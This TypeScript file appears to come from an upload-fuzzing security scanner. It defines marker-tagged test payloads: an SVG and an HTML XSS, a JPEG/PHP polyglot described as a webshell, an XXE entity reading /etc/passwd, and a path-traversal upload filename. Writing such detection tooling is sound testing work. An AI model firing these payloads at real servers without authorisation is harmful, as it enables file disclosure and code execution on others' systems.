// polyglot-files.ts — small, in-memory polyglot file payloads for upload-fuzzing.
// All files contain the CYBERSCOPE_PROVEN token so server-side echo can be detected.

export const PROOF = "CYBERSCOPE_PROVEN";

export interface PolyglotFile {
  filename: string;
  contentType: string;
  bytes: Uint8Array;
  vulnClass: string;
  marker: string;
}

const te = new TextEncoder();

function svgXss(): PolyglotFile {
  return {
    filename: "cs.svg",
    contentType: "image/svg+xml",
    bytes: te.encode(
      `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert('${PROOF}')"><text>${PROOF}</text></svg>`,
    ),
    vulnClass: "stored_xss_svg",
    marker: PROOF,
  };
}

function phpJpg(): PolyglotFile {
  // JPEG magic + PHP webshell payload (most servers that mis-handle .jpg→.php execute it)
  const head = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  const php = te.encode(`<?php echo "${PROOF}"; ?>`);
  const out = new Uint8Array(head.length + php.length);
  out.set(head, 0); out.set(php, head.length);
  return { filename: "cs.php.jpg", contentType: "image/jpeg", bytes: out, vulnClass: "rce_upload_php", marker: PROOF };
}

function htmlPayload(): PolyglotFile {
  return {
    filename: "cs.html",
    contentType: "text/html",
    bytes: te.encode(`<!doctype html><script>document.title='${PROOF}'</script>${PROOF}`),
    vulnClass: "stored_xss_html",
    marker: PROOF,
  };
}

function xxeDoc(): PolyglotFile {
  return {
    filename: "cs.xml",
    contentType: "application/xml",
    bytes: te.encode(
      `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>${PROOF}&x;</r>`,
    ),
    vulnClass: "xxe",
    marker: "root:x:0:0",
  };
}

function zipSlip(): PolyglotFile {
  // Minimal "zip" header + traversal filename as marker (server-side path leak).
  // Not a valid zip but many servers leak filename in echo/error.
  return {
    filename: "../../../../tmp/cs_zipslip.txt",
    contentType: "application/zip",
    bytes: te.encode(`PK\x03\x04 ${PROOF}`),
    vulnClass: "path_traversal_upload",
    marker: PROOF,
  };
}

export const POLYGLOTS: PolyglotFile[] = [svgXss(), phpJpg(), htmlPayload(), xxeDoc(), zipSlip()];
